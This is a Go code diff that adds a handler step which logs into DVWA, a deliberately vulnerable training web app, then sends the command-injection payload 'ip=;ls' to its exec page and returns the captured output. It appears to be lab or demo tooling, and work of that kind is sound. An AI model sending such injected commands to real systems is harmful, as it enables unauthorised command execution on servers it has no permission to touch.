@@ -3,6 +3,7 @@ package main
 import (
 	"net/http"
 	"os/exec"
+	"regexp"
 	"strings"
 
 	"github.com/labstack/echo/v4"
@@ -52,7 +53,7 @@ func handleCommandInjectionAction(c echo.Context) error {
 		return c.String(http.StatusBadRequest, "Invalid username")
 	}
 
-	// DVWA Authentication
+	// Perform Authentication
 	cmd := exec.Command("curl", DVWA_URL+"/login.php",
 		"-H", "authority: "+DVWA_HOST,
 		"-H", "cache-control: max-age=0",
@@ -71,6 +72,33 @@ func handleCommandInjectionAction(c echo.Context) error {
 		return c.String(http.StatusInternalServerError, err.Error())
 	}
 
-	// Return the output of the curl command
-	return c.String(http.StatusOK, string(output))
+	// Execute Command Injection
+	cmd2 := exec.Command("curl", DVWA_URL+"/vulnerabilities/exec/",
+		"-H", "authority: "+DVWA_HOST,
+		"-H", "cache-control: max-age=0",
+		"-H", "content-type: application/x-www-form-urlencoded",
+		"-H", "origin: "+DVWA_URL,
+		"-H", "referer: "+DVWA_URL+"/index.php",
+		"-H", "user-agent: "+USER_AGENT,
+		"--insecure",
+		"--silent",
+		"--data-raw", "ip=;ls&Submit=Submit",
+		"-b", "cookie.txt",
+	)
+
+	output2, err := cmd2.CombinedOutput()
+	if err != nil {
+		return c.String(http.StatusInternalServerError, err.Error())
+	}
+
+	// Extract the content between <h3> tags
+	re := regexp.MustCompile("(?s)<h3>(.*?)</h3>")
+	matches := re.FindStringSubmatch(string(output2))
+
+	// Return the output of the second curl command
+	if len(matches) > 1 {
+		return c.String(http.StatusOK, matches[1])
+	} else {
+		return c.String(http.StatusOK, "No result found")
+	}
 }
